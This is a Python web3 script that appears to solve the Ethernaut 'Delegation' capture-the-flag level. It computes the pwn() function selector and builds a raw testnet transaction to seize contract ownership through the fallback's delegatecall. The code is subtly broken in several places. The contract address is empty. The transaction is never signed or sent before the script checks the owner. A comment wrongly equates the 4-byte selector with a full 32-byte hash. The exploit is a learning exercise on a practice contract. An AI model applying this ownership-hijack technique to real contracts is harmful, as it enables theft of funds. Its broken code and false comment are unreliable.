import os

import solcx
from dotenv import load_dotenv
from web3 import Web3

load_dotenv()

w3 = Web3(Web3.HTTPProvider(os.getenv('PROVIDER_URL')))
if w3.is_connected():
    print("Successfully connected to the provider!")
else:
    print("Failed to connect to the given provider ", os.getenv('PROVIDER_URL'))
    exit()

# Load environment variables
_PRIVATE_KEY = os.getenv('PRIVATE_KEY')
_WALLET = w3.to_checksum_address(os.getenv('WALLET'))

def compile_contract(contract_path: str, version: str, contract_name: str = None):
    solcx.set_solc_version(version=version)
    with open(contract_path, 'r') as file:
        contract_source = file.read()

    compiled_sol = solcx.compile_source(contract_source)
    if contract_name is None:
        contract_key = next(iter(compiled_sol))
    else:
        contract_key = f'<stdin>:{contract_name}'
    contract_interface = compiled_sol[contract_key]
    print(f'Compiled {contract_path} for contract {contract_key}')
    return contract_interface

# Step 1: Load Ethernaut deployed contract
deployed_address = w3.to_checksum_address("")
compiled_contract = compile_contract("./Delegation.sol", '0.8.0', contract_name='Delegation')
delegation_contract = w3.eth.contract(address=deployed_address, abi=compiled_contract['abi'])

# Step 2: Get function selector for pwn()
pwn_func_sig = w3.keccak(text="pwn()")[:4].hex()
print(pwn_func_sig)  # equals to "0xdd365b8b15d5d78ec041b851b68c8b985bee78bee0b87c4acf261024d8beabab"

# Step 3. Build raw transaction with selector in data
tx = {
    'from': _WALLET,
    'chainId': 11155111,
    'nonce': w3.eth.get_transaction_count(w3.to_checksum_address(_WALLET)),
    'to': delegation_contract.address,
    'data': pwn_func_sig,
    'gas': 200000       # adjust as needed
}
# 4. Check new owner
owner = delegation_contract.functions.owner().call()
print("Contract owner is now:", owner)
